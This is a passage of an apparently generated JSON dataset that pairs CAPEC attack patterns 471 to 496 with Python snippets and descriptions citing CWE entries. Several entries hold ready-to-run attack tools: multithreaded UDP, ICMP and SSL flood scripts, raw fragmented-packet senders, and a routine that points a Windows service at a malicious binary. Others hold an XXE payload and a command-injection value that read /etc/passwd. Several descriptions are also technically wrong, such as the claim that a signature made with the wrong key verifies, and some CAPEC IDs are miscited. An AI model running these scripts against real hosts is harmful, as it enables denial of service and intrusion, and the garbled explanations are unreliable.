        "code_snippet": "import os\nimport ctypes\n\n# Simulate an application loading a library\n# Vulnerable to Search Order Hijacking\n\n# Assume the application binary is in the current directory\ncurrent_directory = os.getcwd()\n\n# Path to the legitimate library\nlegit_library_path = os.path.join(current_directory, 'legit_library.dll')\n\n# Path to the rogue library placed by an attacker\nrogue_library_path = os.path.join(current_directory, 'rogue_library.dll')\n\n# Load the library (vulnerable to search order hijacking)\ndef load_library(library_name):\n    try:\n        # Attempt to load the library\n        ctypes.CDLL(library_name)\n        print(f\"Loaded {library_name}\")\n    except OSError as e:\n        print(f\"Failed to load {library_name}: {e}\")\n\n# Attacker places rogue_library.dll in the same directory\n# The application will load the rogue library instead of the legitimate one\nload_library('legit_library.dll')",
        "description": "This Python code snippet demonstrates a vulnerability to Search Order Hijacking. The application attempts to load a legitimate library ('legit_library.dll') from the current directory. However, if an attacker places a rogue library ('rogue_library.dll') in the same directory, the application may load the rogue library instead due to the uncontrolled search path element (CWE-427) and untrusted search path (CWE-426). This represents the main idea of CAPEC-471, where an adversary exploits the search order of libraries to load malicious code. The code uses ctypes to simulate the loading process, highlighting the potential for exploitation."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    user_agent = request.headers.get('User-Agent')\n    # Exposing sensitive information (CWE-200)\n    print(f'User-Agent: {user_agent}')\n    # Crafting a response with potential XSS vulnerability (CWE-79)\n    response = f'<script>console.log(\"Browser: {user_agent}\")</script>'\n    return render_template_string(response)\n\n@app.route('/exploit')\ndef exploit():\n    # Using GET request with sensitive information (CWE-598)\n    sensitive_info = request.args.get('info')\n    # Incomplete denylist for XSS (CWE-692)\n    if '<script>' in sensitive_info:\n        return 'Blocked'\n    return f'Sensitive Info: {sensitive_info}'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates browser fingerprinting and related vulnerabilities. The 'index' route captures the User-Agent header from the incoming request, which reveals the browser type and version (CWE-200). It then embeds this information in a script tag, creating a potential XSS vulnerability (CWE-79). The 'exploit' route processes a GET request with sensitive information in the query string (CWE-598) and attempts to block XSS using an incomplete denylist (CWE-692). This code illustrates how an attacker might gather browser information and exploit related vulnerabilities in a web application."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "import hashlib\nimport hmac\n\n# Simulate a message and a fake signature\nmessage = b'This is a secure message.'\nsecret_key = b'secret'\n\n# Vulnerable: Using a weak hash function (MD5) for HMAC\nfake_signature = hmac.new(secret_key, message, hashlib.md5).hexdigest()\n\n# Simulate receiving the message and signature\nreceived_message = message\nreceived_signature = fake_signature\n\n# Vulnerable: Improper input validation and weak cryptographic algorithm\nif hmac.new(secret_key, received_message, hashlib.md5).hexdigest() == received_signature:\n    print(\"Message is from a trusted source.\")\nelse:\n    print(\"Message is not from a trusted source.\")",
        "description": "This Python code snippet demonstrates a vulnerable implementation of message authentication using HMAC with a weak cryptographic algorithm (MD5). The code simulates the generation and verification of a message signature. The use of MD5 makes the HMAC susceptible to collision attacks, allowing an attacker to spoof the signature. Additionally, the code lacks proper input validation, making it easier for an attacker to craft a malicious message that appears to be from a trusted source. This embodies the main idea of the 'Signature Spoof' CAPEC, highlighting weaknesses such as the use of a broken cryptographic algorithm (CWE-327) and improper input validation (CWE-20)."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "import os\nimport hashlib\nimport base64\n\n# Simulate storing a private key insecurely\nprivate_key = 'my_private_key'\nwith open('private_key.txt', 'w') as f:\n    f.write(private_key)\n\n# Simulate an attacker stealing the private key\nwith open('private_key.txt', 'r') as f:\n    stolen_key = f.read()\n\n# Attacker uses the stolen key to sign a message\nmessage = 'Important transaction'\nsignature = base64.b64encode(hashlib.sha256((message + stolen_key).encode()).digest()).decode()\n\n# Victim verifies the signature, assuming it is from a trusted source\ntrusted_public_key = 'my_public_key'  # In a real scenario, this would be used to verify the signature\nis_valid = (signature == base64.b64encode(hashlib.sha256((message + private_key).encode()).digest()).decode())\n\nprint(f'Signature valid: {is_valid}')",
        "description": "This Python code snippet demonstrates a scenario where an attacker steals a private key that is stored insecurely (CWE-522). The attacker then uses the stolen key to sign a message, which can mislead the victim into believing the message is from a trusted source (CAPEC-239). The victim verifies the signature without realizing the key has been compromised, leading to potential authentication bypass (CWE-290). The code highlights the importance of securely storing private keys and ensuring robust authentication mechanisms."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "import hashlib\nimport hmac\n\n# Simulated verification function\ndef verify_signature(message, signature, key):\n    # CWE-327: Using a weak hash function (MD5)\n    expected_signature = hmac.new(key.encode(), message.encode(), hashlib.md5).hexdigest()\n    \n    # CWE-347: Improper verification of cryptographic signature\n    if signature == expected_signature:\n        return True\n    else:\n        return False\n\n# Example usage\nmessage = 'Important message'\nkey = 'secret_key'\n# Adversary can generate a valid signature without knowing the key\nforged_signature = hmac.new('wrong_key'.encode(), message.encode(), hashlib.md5).hexdigest()\n\n# CWE-290: Authentication Bypass by Spoofing\nif verify_signature(message, forged_signature, key):\n    print('Signature is valid.')\nelse:\n    print('Signature is invalid.')",
        "description": "This Python code snippet demonstrates a vulnerable signature verification process. The `verify_signature` function uses the MD5 hash function (CWE-327) to generate an HMAC signature, which is known to be weak and susceptible to collision attacks. The function then improperly verifies the cryptographic signature (CWE-347) by directly comparing the provided signature with the expected one. An adversary can exploit this weakness by generating a valid signature using a different key, leading to an authentication bypass (CWE-290). This embodies the main idea of CAPEC-347, where improper validation of cryptographic signatures can be exploited to spoof signatures without knowing the correct key."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "import hashlib\nimport hmac\n\n# Simulated function to verify a signature\n# CWE-347: Improper Verification of Cryptographic Signature\ndef verify_signature(message, signature, secret_key):\n    expected_signature = hmac.new(secret_key.encode(), message.encode(), hashlib.sha256).hexdigest()\n    return hmac.compare_digest(expected_signature, signature)\n\n# Simulated function to parse and display a message\n# CWE-290: Authentication Bypass by Spoofing\ndef parse_message(data_blob):\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    # CWE-300: Channel Accessible by Non-Endpoint\n    try:\n        message, signature = data_blob.split(':')\n        if verify_signature(message, signature, 'secret_key'):\n            print(f\"Message from trusted source: {message}\")\n        else:\n            print(\"Signature verification failed!\")\n    except Exception as e:\n        print(f\"Error parsing message: {e}\")\n\n# Example of a spoofed data blob\n# An attacker could manipulate this to bypass signature verification\nspoofed_data_blob = \"Hello, this is a spoofed message:invalid_signature\"\nparse_message(spoofed_data_blob)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Signature Spoofing by Misrepresentation' (CAPEC). The `verify_signature` function is intended to verify the cryptographic signature of a message (CWE-347). The `parse_message` function simulates the parsing and display of a message, but it contains several weaknesses: it does not correctly specify the intended destination (CWE-941), does not ensure message integrity during transmission (CWE-924), and does not adequately verify the identity of actors at both ends of the communication channel (CWE-300). An attacker can exploit these weaknesses by crafting a spoofed data blob to bypass signature verification and misrepresent the signer's identity, leading to potential compromising actions."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "import hashlib\nimport hmac\n\n# Simulated signed and unsigned content\nsigned_content = b'Signed content'\nunsigned_content = b'Unsigned content'\n\n# Secret key for HMAC\nsecret_key = b'secret'\n\n# Generate HMAC for signed content\nsigned_hmac = hmac.new(secret_key, signed_content, hashlib.sha256).hexdigest()\n\n# Function to verify HMAC\ndef verify_hmac(content, received_hmac):\n    calculated_hmac = hmac.new(secret_key, content, hashlib.sha256).hexdigest()\n    return hmac.compare_digest(calculated_hmac, received_hmac)\n\n# Vulnerable function that processes both signed and unsigned content\n# without proper verification\n\ndef process_content(content, received_hmac=None):\n    if received_hmac:\n        if verify_hmac(content, received_hmac):\n            print('Signed content verified and processed:', content)\n        else:\n            print('Invalid HMAC. Content rejected.')\n    else:\n        # Unsigned content is processed without verification\n        print('Unsigned content processed:', content)\n\n# Example usage\nprocess_content(signed_content, signed_hmac)  # Properly signed content\nprocess_content(unsigned_content)  # Unsigned content\n",
        "description": "This Python code snippet demonstrates a vulnerability where both signed and unsigned content are processed by the same function without proper distinction. The `process_content` function processes signed content by verifying its HMAC, but it also processes unsigned content without any verification. This represents the CAPEC 'Signature Spoofing by Mixing Signed and Unsigned Content' by showing how an attacker could exploit the lack of proper verification for unsigned content. The related CWEs are illustrated by the improper verification of cryptographic signatures (CWE-347) and the potential for protection mechanism failure (CWE-693)."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "import win32serviceutil\nimport win32service\nimport win32api\nimport win32con\n\n# CWE-284: Improper Access Control\n# CWE-15: External Control of System or Configuration Setting\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n\n# Function to modify a Windows service configuration\n# This code assumes the user has the necessary permissions to modify the service\n\ndef modify_service(service_name, binary_path):\n    try:\n        # Open the service manager\n        scm_handle = win32service.OpenSCManager(None, None, win32con.SC_MANAGER_ALL_ACCESS)\n        if scm_handle == 0:\n            raise Exception('Failed to open service manager')\n\n        # Open the service\n        service_handle = win32service.OpenService(scm_handle, service_name, win32service.SERVICE_ALL_ACCESS)\n        if service_handle == 0:\n            raise Exception('Failed to open service')\n\n        # Change the service configuration to point to a new binary\n        win32service.ChangeServiceConfig(service_handle, win32service.SERVICE_NO_CHANGE, win32service.SERVICE_NO_CHANGE, win32service.SERVICE_NO_CHANGE, binary_path, None, 0, None, None, None, None)\n        print(f'Service {service_name} configuration updated to use {binary_path}')\n\n        # Close the service handle\n        win32service.CloseServiceHandle(service_handle)\n        win32service.CloseServiceHandle(scm_handle)\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\nmodify_service('SomeService', 'C:\\path\\to\\malicious_binary.exe')",
        "description": "This Python code snippet demonstrates how an adversary could exploit improper access control (CWE-284) and external control of system or configuration settings (CWE-15) to modify the execution parameters of a Windows service. The function `modify_service` takes a service name and a path to a new binary, then updates the service configuration to execute the new binary. This represents the main idea of the CAPEC 'Modification of Windows Service Configuration', where an attacker replaces an existing service's executable with a malicious one. The code assumes the user has the necessary permissions to modify the service, highlighting the risk of improper access control."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "import ssl\nimport socket\n\n# Create an SSL context that does not verify certificates\ncontext = ssl.create_default_context()\ncontext.check_hostname = False\ncontext.verify_mode = ssl.CERT_NONE\n\n# Connect to a server with the insecure context\nhostname = 'malicious.example.com'\nport = 443\n\nwith socket.create_connection((hostname, port)) as sock:\n    with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n        print(ssock.version())\n        # The connection is established without validating the certificate\n        # This can allow a malicious root certificate to be trusted\n        # and enable man-in-the-middle attacks\n",
        "description": "This Python code snippet demonstrates a vulnerable SSL/TLS connection setup where certificate validation is disabled. The `ssl.create_default_context()` function is used to create an SSL context, but the `check_hostname` and `verify_mode` settings are modified to disable certificate validation. This insecure context is then used to connect to a server, allowing any certificate, including a malicious root certificate, to be trusted. This can facilitate man-in-the-middle attacks by adversaries who can spoof legitimate websites and collect sensitive information such as login credentials. The code embodies the main idea of the CAPEC by showing how improper certificate validation can be exploited."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "import os\nimport subprocess\n\n# Vulnerable function that runs a command in a virtualized environment\n# without proper isolation or validation\n\ndef run_command_in_vm(command):\n    # Simulate running a command in a virtual machine\n    vm_command = f\"vm_exec {command}\"\n    result = subprocess.run(vm_command, shell=True, capture_output=True)\n    return result.stdout\n\n# Example usage\nif __name__ == '__main__':\n    # This command could be injected by an attacker\n    malicious_command = \"; cat /etc/passwd\"\n    output = run_command_in_vm(malicious_command)\n    print(output.decode())",
        "description": "This Python code snippet demonstrates a vulnerable function that runs a command within a virtualized environment without proper isolation or validation. The function `run_command_in_vm` simulates executing a command in a virtual machine by using `subprocess.run` with `shell=True`, which is inherently insecure. An attacker could exploit this by injecting malicious commands, such as `; cat /etc/passwd`, to escape the virtualized environment and access sensitive information on the host system. This example embodies the main idea of CAPEC-272 (Escaping Virtualization) and highlights related CWEs such as CWE-693 (Protection Mechanism Failure), CWE-653 (Improper Isolation or Compartmentalization), and CWE-114 (Process Control)."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "import requests\nimport ssl\n\n# Create a custom SSL context to leave the SNI field blank (Domainless Fronting)\ncontext = ssl.create_default_context()\ncontext.check_hostname = False\ncontext.verify_mode = ssl.CERT_NONE\n\n# URL with a different domain in the Host header (Domain Fronting)\nurl = 'https://example.com/resource'\nheaders = {\n    'Host': 'malicious.com'\n}\n\n# Send the request\nresponse = requests.get(url, headers=headers, verify=False)\n\nprint(response.status_code)\nprint(response.text)",
        "description": "This Python code snippet demonstrates a simplified version of Domain Fronting and Domainless Fronting attacks. It uses the 'requests' library to send an HTTP GET request to 'example.com' while setting the 'Host' header to 'malicious.com'. Additionally, it creates a custom SSL context that disables hostname checking and certificate verification, effectively leaving the SNI field blank. This can lead to traffic being routed to an unintended destination, embodying the main idea of CAPEC-Contradictory Destinations in Traffic Routing Schemes. The code also touches on related CWEs such as Improper Restriction of Communication Channel to Intended Endpoints (CWE-923) and Incorrectly Specified Destination in a Communication Channel (CWE-941)."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "import socket\n\n# Vulnerable server code that does not limit resource allocation\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 8080))\nserver_socket.listen(5)\n\nprint('Server is listening on port 8080...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr} has been established.')\n    # No limit on the number of connections or resources allocated\n    client_socket.send(bytes('Welcome to the server!', 'utf-8'))\n    client_socket.close()",
        "description": "This Python code snippet represents a simple TCP server that is vulnerable to a TCP Flood attack. The server listens for incoming connections on port 8080 and accepts them without any limit on the number of connections or resources allocated (CWE-770). This lack of resource allocation control can be exploited by an adversary to perform a TCP Flood attack, overwhelming the server and denying legitimate users access to the service. The code does not implement any throttling or resource management, making it susceptible to denial-of-service attacks."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data (potentially from an untrusted source)\nxml_data = '''\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n'''\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        root = tree.getroot()\n        print(ET.tostring(root, encoding='unicode'))\n    except ET.ParseError as e:\n        print(f\"XML parsing error: {e}\")\n\n# Parse the XML data\nparse_xml(xml_data)",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-230 and CAPEC-231, specifically focusing on CWE-611 (Improper Restriction of XML External Entity Reference). The code uses the xml.etree.ElementTree module to parse an XML document that includes an external entity reference. The XML data contains a DOCTYPE declaration with an external entity that attempts to access the '/etc/passwd' file. This represents an XML External Entity (XXE) attack, where the XML parser processes the external entity and potentially exposes sensitive information. The code lacks proper validation and restriction of external entities, making it vulnerable to such attacks."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "import random\nimport hashlib\n\n# Simulate a weak random number generator\nclass WeakPRNG:\n    def __init__(self, seed):\n        self.seed = seed\n\n    def get_random_number(self):\n        random.seed(self.seed)\n        return random.randint(0, 1000000)\n\n# Simulate the generation of a private key using a weak PRNG\nweak_prng = WeakPRNG(seed=12345)\nprivate_key = weak_prng.get_random_number()\n\n# Simulate the signing process\nmessage = 'Important transaction'\nmessage_hash = hashlib.sha256(message.encode()).hexdigest()\nsignature = hashlib.sha256((message_hash + str(private_key)).encode()).hexdigest()\n\n# Attacker can predict the private key and forge a signature\nattacker_private_key = weak_prng.get_random_number()\nforged_signature = hashlib.sha256((message_hash + str(attacker_private_key)).encode()).hexdigest()\n\nprint(f'Original Signature: {signature}')\nprint(f'Forged Signature: {forged_signature}')",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can predict a private signature key due to the use of a weak pseudo-random number generator (PRNG). The WeakPRNG class simulates a PRNG with a predictable seed. The private key is generated using this weak PRNG, and a message is signed using this key. An attacker, knowing the seed, can predict the private key and forge a signature for the same message. This embodies the CAPEC 'Signature Spoofing by Key Recreation' and highlights CWE-330 (Use of Insufficiently Random Values) and CWE-1241 (Use of Predictable Algorithm in Random Number Generator)."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "import socket\nimport random\n\n# Configuration\nTARGET_IP = '192.168.1.1'\nTARGET_PORT = 80\nPACKET_SIZE = 1024\n\n# Create a UDP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n# Generate random data to send\ndata = random._urandom(PACKET_SIZE)\n\n# Flood the target with UDP packets\nwhile True:\n    sock.sendto(data, (TARGET_IP, TARGET_PORT))",
        "description": "This Python code snippet demonstrates a basic UDP flood attack, which is a type of Denial of Service (DoS) attack. The code creates a UDP socket and continuously sends random data to a specified target IP and port. This can overwhelm the target's network bandwidth and resources, potentially causing service disruption. The code embodies the main idea of CAPEC-UDP Flood by exploiting the session-less nature of UDP, making it difficult to trace the source of the attack. The related CWEs provide additional context, such as the lack of resource limits (CWE-770), insufficient control of network message volume (CWE-406), and the potential for network amplification."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "import socket\nimport threading\n\n# Function to perform ICMP flood attack\ndef icmp_flood(target_ip):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    packet = b'\\x08\\x00' + b'\\x00' * 46  # ICMP Echo Request with payload\n    while True:\n        sock.sendto(packet, (target_ip, 0))\n\n# Start multiple threads to simulate high-rate ICMP flood\nthreads = []\ntarget_ip = '192.168.1.1'  # Example target IP\nfor _ in range(100):  # Number of threads to simulate high-rate attack\n    thread = threading.Thread(target=icmp_flood, args=(target_ip,))\n    thread.start()\n    threads.append(thread)\n\n# Wait for all threads to complete\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates an ICMP flood attack, which is a type of Denial of Service (DoS) attack. The code creates multiple threads to send a high rate of ICMP Echo Request packets (ping) to a target IP address. This can overwhelm the target's network bandwidth, making it difficult for legitimate users to access the service. The code also highlights CWE-770 (Allocation of Resources Without Limits or Throttling) by not imposing any restrictions on the number of threads or the rate of packet sending, leading to potential resource exhaustion. Additionally, the use of raw sockets and the ability to spoof source addresses align with the session-less nature of ICMP, making it challenging to trace the attack's origin."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "from flask import Flask, request\nimport threading\nimport time\n\napp = Flask(__name__)\n\n# Simulate a resource-intensive operation\n@app.route('/resource', methods=['GET'])\ndef resource_intensive_operation():\n    time.sleep(5)  # Simulate a delay to represent resource consumption\n    return 'Resource processed'\n\n# Start the Flask application\nif __name__ == '__main__':\n    app.run(threaded=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that simulates a resource-intensive operation. The '/resource' endpoint represents a service that processes HTTP GET requests. The `time.sleep(5)` call simulates a delay, indicating resource consumption. This setup can be exploited by an adversary to perform an HTTP Flood attack (CAPEC-488) by sending numerous GET requests to the '/resource' endpoint, thereby consuming server resources and potentially denying service to legitimate users. The code also implicitly demonstrates CWE-770 (Allocation of Resources Without Limits or Throttling) as there are no restrictions on the number of requests that can be processed concurrently, and CWE-410 (Insufficient Resource Pool) as the server may not handle peak demand effectively."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "import ssl\nimport socket\nimport threading\n\n# Function to create SSL connections and flood the server\ndef ssl_flood(target_host, target_port):\n    context = ssl.create_default_context()\n    while True:\n        try:\n            with socket.create_connection((target_host, target_port)) as sock:\n                with context.wrap_socket(sock, server_hostname=target_host) as ssock:\n                    # Renegotiate SSL connection repeatedly\n                    ssock.do_handshake()\n        except Exception as e:\n            pass\n\n# Target server details\ntarget_host = 'example.com'\ntarget_port = 443\n\n# Number of threads to simulate multiple attacking machines\nnum_threads = 100\n\n# Start multiple threads to flood the server\nthreads = []\nfor _ in range(num_threads):\n    thread = threading.Thread(target=ssl_flood, args=(target_host, target_port))\n    thread.start()\n    threads.append(thread)\n\n# Wait for all threads to complete\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates an SSL Flood attack, where multiple threads are used to create SSL connections to a target server and repeatedly renegotiate the SSL handshake. This consumes a significant amount of server resources, potentially leading to a denial of service for legitimate users. The code leverages the concept of 'Uncontrolled Resource Consumption' (CWE-400) by continuously creating and renegotiating SSL connections without any limits or throttling, which can exhaust the server's resources. The use of multiple threads simulates a distributed attack, amplifying the impact on the server."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "import socket\n\n# Vulnerable UDP server that can be exploited for amplification attacks\nclass AmplificationServer:\n    def __init__(self, host='0.0.0.0', port=12345):\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.server_socket.bind((host, port))\n        print(f'Server listening on {host}:{port}')\n\n    def start(self):\n        while True:\n            data, addr = self.server_socket.recvfrom(1024)  # Receive request\n            print(f'Received request from {addr}')\n            response = self.generate_large_response(data)\n            self.server_socket.sendto(response, addr)  # Send amplified response\n\n    def generate_large_response(self, data):\n        # Generate a large response based on the input data\n        return data * 100  # Amplification factor\n\nif __name__ == '__main__':\n    server = AmplificationServer()\n    server.start()",
        "description": "This Python code snippet represents a simple UDP server that is vulnerable to amplification attacks. The server listens for incoming UDP requests and responds with a much larger payload, amplifying the original request. This embodies the main idea of the CAPEC 'Amplification' attack, where an adversary can send a small request to a server and cause it to generate a large response, which can be directed at a target server to overwhelm it. The code does not implement any throttling or resource limits (CWE-770), allows asymmetric resource consumption (CWE-405), and does not control the volume of network messages (CWE-406)."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "import re\n\ndef expand_macros(data):\n    pattern = re.compile(r'\\{\\{(.*?)\\}\\}')\n    expanded_data = data\n    for _ in range(1000):  # Arbitrary large number to simulate excessive expansion\n        matches = pattern.findall(expanded_data)\n        if not matches:\n            break\n        for match in matches:\n            expanded_data = expanded_data.replace(f'{{{{{match}}}}}', match * 1000)  # Exponential growth\n    return expanded_data\n\n# Example usage\ninput_data = '{{macro}}'\ntry:\n    result = expand_macros(input_data)\n    print(\"Expansion successful\")\nexcept MemoryError:\n    print(\"MemoryError: Expansion caused excessive memory allocation\")",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Quadratic Data Expansion' (CAPEC-197). The function `expand_macros` takes a string `data` and performs macro-like substitutions using a regular expression to find patterns of the form `{{macro}}`. It then replaces each macro with a large expansion of itself, leading to exponential growth in memory usage. The loop runs a large number of iterations to simulate excessive expansion, potentially causing a denial of service due to memory exhaustion. This example embodies CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-1325 (Improperly Controlled Sequential Memory Allocation) by not limiting the number of expansions and the total memory allocated. The code also highlights CWE-1043 (Data Element Aggregating an Excessively Large Number of Non-Primitive Elements) by creating a large number of sub-elements during expansion."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "import re\n\ndef vulnerable_regex(input_string):\n    # CWE-1333: Inefficient Regular Expression Complexity\n    # CWE-777: Regular Expression without Anchors\n    pattern = re.compile(r'(a+)+$')\n    match = pattern.match(input_string)\n    return match is not None\n\n# Example of input that causes exponential blowup\ninput_string = 'a' * 30 + '!'  # This input will cause the regex to backtrack excessively\nprint(vulnerable_regex(input_string))",
        "description": "This Python code snippet demonstrates a vulnerable regular expression that can lead to exponential blowup, as described in the CAPEC. The `vulnerable_regex` function uses a regular expression pattern `(a+)+$` which is known to have exponential time complexity due to nested quantifiers. This pattern is also not anchored at the start (CWE-777), which can lead to inefficient processing. The input string 'a' * 30 + '!' is designed to cause excessive backtracking, leading to high CPU consumption and potential denial of service. This example highlights the importance of using efficient and well-anchored regular expressions to avoid uncontrolled resource consumption (CWE-400) and inefficient complexity (CWE-1333)."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable SOAP message handler\nsoap_message = '''\n<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\">\n  <soap:Body>\n    <ArrayOfStrings xmlns=\"http://example.com/\">\n      <string>1</string>\n      <string>2</string>\n      <!-- Imagine this continues for 1,000,000 elements -->\n    </ArrayOfStrings>\n  </soap:Body>\n</soap:Envelope>\n'''\n\ntry:\n    # Parse the SOAP message\n    root = ET.fromstring(soap_message)\n    # Extract the array elements\n    array_elements = root.findall('.//{http://example.com/}string')\n    # Allocate memory for the array elements\n    array = [elem.text for elem in array_elements]\n    print(f\"Allocated array with {len(array)} elements.\")\nexcept ET.ParseError as e:\n    print(f\"Failed to parse SOAP message: {e}\")\n",
        "description": "This Python code snippet demonstrates a vulnerable SOAP message handler that processes a SOAP message containing an array of strings. The SOAP message is parsed using the xml.etree.ElementTree library. The code extracts the array elements and allocates memory for them without any restrictions on the size of the array. This can lead to memory exhaustion if an attacker sends a SOAP message with a very large array declaration, as described in the CAPEC. The code embodies CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-1325 (Improperly Controlled Sequential Memory Allocation) by not imposing any limits on the number of elements in the array."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "import socket\n\n# Create a raw socket\ns = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Construct a fragmented TCP packet\n# Fragment 1: TCP header with SYN flag\nfragment1 = b'\\x45\\x00\\x00\\x28\\xab\\xcd\\x40\\x00\\x40\\x06\\x00\\x00\\xc0\\xa8\\x00\\x01\\xc0\\xa8\\x00\\x02'  # IP header\nfragment1 += b'\\x00\\x50\\x00\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x02\\x20\\x00\\x00\\x00\\x00\\x00\\x00'  # TCP header with SYN flag\n\n# Fragment 2: TCP header continuation\nfragment2 = b'\\x45\\x00\\x00\\x28\\xab\\xcd\\x40\\x01\\x40\\x06\\x00\\x00\\xc0\\xa8\\x00\\x01\\xc0\\xa8\\x00\\x02'  # IP header\nfragment2 += b'\\x00\\x50\\x00\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'  # TCP header continuation\n\n# Send the fragments\ns.sendto(fragment1, ('192.168.0.2', 0))\ns.sendto(fragment2, ('192.168.0.2', 0))\n\ns.close()",
        "description": "This Python code snippet demonstrates a TCP Fragmentation attack. It creates a raw socket and constructs two TCP packet fragments. The first fragment contains the IP header and part of the TCP header with the SYN flag set. The second fragment contains the continuation of the TCP header. By sending these fragments separately, the attacker aims to bypass network filtering rules that may not inspect the second fragment. This code embodies the main idea of the CAPEC by attempting to evade network controls through TCP fragmentation. The related CWEs provide context on potential weaknesses, such as improper resource handling and cleartext transmission, which could be exploited in conjunction with this attack."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "import socket\nimport random\n\n# Function to generate a large UDP packet\ndef generate_large_packet(size):\n    return b'A' * size\n\n# Function to send fragmented UDP packets\ndef send_fragmented_udp(target_ip, target_port, packet_size, fragment_size):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    packet = generate_large_packet(packet_size)\n    fragments = [packet[i:i+fragment_size] for i in range(0, len(packet), fragment_size)]\n    for fragment in fragments:\n        sock.sendto(fragment, (target_ip, target_port))\n\n# Target server details\nTARGET_IP = '192.168.1.1'\nTARGET_PORT = 12345\nPACKET_SIZE = 2000  # Larger than typical MTU\nFRAGMENT_SIZE = 1000  # Fragment size to force fragmentation\n\n# Send fragmented packets to the target server\nsend_fragmented_udp(TARGET_IP, TARGET_PORT, PACKET_SIZE, FRAGMENT_SIZE)",
        "description": "This Python code snippet demonstrates a UDP Fragmentation attack. The `generate_large_packet` function creates a large UDP packet exceeding the typical MTU size. The `send_fragmented_udp` function then fragments this large packet into smaller pieces and sends them to the target server. The target server, identified by `TARGET_IP` and `TARGET_PORT`, will need to reassemble these fragments, consuming CPU and memory resources. This attack can lead to resource exhaustion, aligning with CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-406 (Insufficient Control of Network Message Volume). The code represents the main idea of the CAPEC by showing how an attacker can exploit UDP fragmentation to overwhelm a server."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
